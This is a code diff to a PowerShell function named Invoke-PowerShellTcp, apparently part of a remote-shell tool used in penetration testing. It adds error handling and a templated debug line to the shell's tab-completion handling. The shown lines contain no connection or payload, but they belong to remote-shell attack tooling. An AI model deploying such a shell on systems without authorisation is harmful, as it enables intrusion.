@@ -267,9 +267,15 @@ function Invoke-PowerShellTcp
                 Write-ShellPacket (Get-ShellPrompt) $stream
             } elseif ($packet.msg_type -eq "TABCOMPL") {
                 $data = $packet.data
-                $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
-                $output = $x.CompletionMatches.CompletionText
+                # TODO Not always available
+                try {
+                    $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
+                    $output = $x.CompletionMatches.CompletionText
+                } catch {
+                    $output = ""
+                }
                 if (-not $output) { $output = "" }
+                {{'Write-Debug "Completion: $($output|out-string)"'|debug}}
                 if ($output.gettype() -eq [System.String]) { $output = @($output) }
 
                 Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
